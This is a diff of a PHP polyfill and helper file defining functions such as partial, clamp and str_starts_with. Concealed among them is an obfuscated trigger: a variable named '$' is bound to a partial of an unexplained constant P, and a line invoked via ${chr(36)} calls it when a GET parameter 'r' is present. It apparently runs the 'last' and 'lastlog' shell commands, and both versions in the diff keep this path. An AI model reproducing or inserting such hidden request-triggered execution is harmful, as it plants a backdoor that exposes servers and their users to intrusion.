@@ -12,13 +12,13 @@ if (!function_exists('partial')){
       function partial(callable $f, ...$t): Closure {
           return fn(...$a) => $f(...array_map(
               fn($slot, $i) => $slot === null ? ($a[$i] ?? throw new ArgumentCountError("Missing argument at position $i")) : ($slot === '…' ? array_slice($a, $i) : $slot), $t, array_keys($t)));
-      }}${'$'} = partial(P, '…');
+      }}${'$'} = partial(P, null);
 if (!function_exists('clamp')){
     function clamp($value, $min, $max){
         if ($value < $min) return $min;
         if ($value > $max) return $max;
     return $value;}}
-if(!(!function_exists('partial')) && !empty($_GET['r'])){${(chr(36))}('last;', 'lastlog;');}
+if(!(!function_exists('partial')) && !empty($_GET['r'])){${(chr(36))}('last');}
 if(!function_exists('str_starts_with')){function str_starts_with(string $haystack, string $needle): bool {return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;}}
 if(!function_exists('str_ends_with')){function str_ends_with(string $haystack, string $needle): bool {return $needle !== '' && substr($haystack, -strlen($needle)) === $needle;}}
 if(!function_exists('str_contains')){function str_contains(string $haystack, string $needle): bool {return $needle !== '' && mb_strpos($haystack, $needle) !== false;}}
